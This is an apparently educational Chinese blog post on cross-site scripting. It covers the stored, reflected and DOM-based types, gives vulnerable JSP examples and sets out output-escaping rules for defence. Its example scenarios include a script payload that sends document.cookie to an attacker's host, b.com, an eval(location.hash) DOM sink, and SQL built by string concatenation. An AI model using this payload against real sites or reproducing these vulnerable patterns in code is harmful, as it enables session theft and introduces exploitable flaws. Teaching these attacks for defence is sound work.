---
title: "XSS Overview"
layout: post
date: 2016-08-15
permalink : /post/xss-overview
tag:
- SECURITY
blog: true
---

## 一、什么是XSS？

**跨站脚本攻击**(Cross Site Scripting)：攻击者往Web页面里插入恶意脚本，当用户浏览该页面时，嵌入页面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。恶意的内容通常需要以一段JavaScript的形式发送到浏览器,但也可能包括HTML、Flash,或任何其他类型的浏览器可以执行的代码

XSS的危害通常包括传输私有数据,像cookie或session信息；重定向受害者看到的内容；或在用户的机器上进行恶意操作。


XSS攻击发生的原因：

1. 数据通过一个未信任的来源进入Web应用中，最常见的是一个web请求
2. 数据中包含动态文本，然后发送给用户，但是没有校验恶意的文本，如velocity渲染页面


## 二、XSS 的类型

### Stored XSS(存储型XSS)

把用户输入的数据（比如恶意的js代码）存储在服务器端，具有很强的稳定性，危害时间长，每次用户读取这段数据时都会执行一次，所以受害者是很多人。

**最典型的攻击场景就是留言板。**

其攻击过程如下：

- Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。
- Charly注意到Bob的站点具有存储型XXS漏洞。
- Charly发布一个包含XSS攻击脚本的热点信息，并吸引其它用户纷纷阅读。
- Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。


### Reflected XSS(反射型XSS)

反射攻击是通过另一种方式攻击受害者,比如在一封电子邮件。当用户点击了一个恶意链接,将会提交一个特殊的表单,或者仅仅只是浏览恶意网站,注入的代码将反射到攻击用户的浏览器

**最典型的攻击场景就是给个恶意链接让你去点。**

其攻击过程如下：

-  Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息（比如银行帐户信息）。
- Charly发现Bob的站点包含反射性的XSS漏洞。
- Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。
- Alice在登录到Bob的站点后，浏览Charly提供的URL。

嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息（授权、信用卡、帐号信息等）然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。

### DOM Based XSS

这种不是按照存储在哪里来划分的，可以说是反射型的一种，由于历史原因，归为一类，通过改变DOM结构形成的XSS称之为DOM Based。

## 三、例子

## eg.1 Reflected XSS 

```java
<% String eid = request.getParameter("eid"); %> 
	...
	Employee ID: <%= eid %>
```

jsp页面中，我们可能会像上面那样写。

最初这似乎不可能出现的漏洞，因为攻击者不可能用来输入一段而已的代码然后攻击自己的电脑，导致恶意代码运行在自己的电脑。但**真正的危险**是,攻击者将创建恶意URL,然后使用电子邮件或社会工程学技巧来吸引受害者访问的URL链接。受害者点击链接时,无意中反映了恶意的内容通过脆弱的web应用程序回自己的电脑。这个机制称为**反射型XSS攻击**

> 
当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫eid的参数直接显示的。 我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?eid=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。

## eg.2 Stored XSS

```java
<%... 
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next(); 
  String name = rs.getString("name");
%>

Employee Name: <%= name %>
```

这段代码功能是显示名字,但这并没有阻止被利用。这段代码相对上一种而言危险更小,因为名字是读取数据库的值。然而,如果名字来源于用户提供的输入,那么数据库可以为恶意内容的一个渠道。没有适当的输入验证数据就存储在数据库中,攻击者可以在用户的web浏览器中执行恶意命令，也就是**存储型XSS攻击**。

> 
 a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功

### eg.3 DOM Based XSS

`http://www.a.com/xss/domxss.html`页面中代码如下：

```java
<script>
eval(location.hash.substr(1));
</script>
```

触发方式为：`http://www.a.com/xss/domxss.html#alert(1)`

## 四、网站是否会遭受XSS攻击？

XSS漏洞很难被识别或从一个web应用程序删除。发现缺陷的最好方法是进行**代码的安全审查**和搜索所有**从HTTP请求输入且有可能使其输出到页面**的代码，并对这些代码进行相应的处理。

注意,可以使用各种不同的HTML标记传输恶意JavaScript。Nessus Nikto,和其他一些可用的工具可以帮助扫描一个网站的这些缺陷,但却只是完成表面功夫。如果一个网站的某一部分是脆弱的,那么极有可能还有其他问题。


## 防御XSS的具体措施

### Rule1: 除了允许的位置外，不要将不信任的数据其他地方

也就是默认否认所有, 《白帽子讲web安全》中的Secure By Default原则

### Rule2: 在插入html标签内前对插入的数据进行转义

HTML元素(HTML elements)如下，也就是插入html标签的内容：

```html
<body>...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...</body>
 
 <div>...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...</div>
```

对这种情况要进行如下转义：

```html
 & --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27; 
 / --> &#x2F;
```

### Rule3: 在插入HTML的属性时对属性进行转义

如下：包括插入到无引号/单引号/双引号的数据

```html
 <div attr=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...>content</div>   
 <div attr='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'>content</div>   
 <div attr="...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">content</div>   
```

对于这种情况，除了字母数字，其它一律需要将所有其它字符转为&#xHH的形式；为什么要转义这么多的原因是：开发人员有时会忽略引号的书写，不遵守规范。
因此对空格，%，*，-，/，;，<等进行处理，当然Rule2中的也要进行转义。

### Rule4: 插入Javascript标签内前转义数据

这类处理的情景如下：

```javascript
<script>alert('...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...')</script>     
<script>x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'</script>         
<div onmouseover="x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'"</div>  
```

### Rule5: 在使用style属性时，对CSS转义和严格验证

```javascript
<style>selector { property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...; } </style>     property value
<style>selector { property : "...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."; } </style>   property value
<span style="property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">text</span>       property value
```
处理方式和Rule3一致，同时需要注意的是不能使用转义接近如用`\"`转义`"`字符，因为引号字符可以会被认为是某个属性的终止，作为html执行。同时，这种捷径有可能导致转义再转义攻击。
比如攻击者发送`\"`，然后代码转义成`\\"`，这样引号就生效了，也就是相当于没有转义

## Rule6: 在插入URL参数时对URL进行转义

```javascript
 <a href="http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">link</a >  
```

对于这种情况，除了字母数字，其它一律需要将所有其它字符转为%HH的形式(其实可以查看RFC对应的文档就可以知道允许哪些字符，哪些需要转义)。
如空格转义成%20





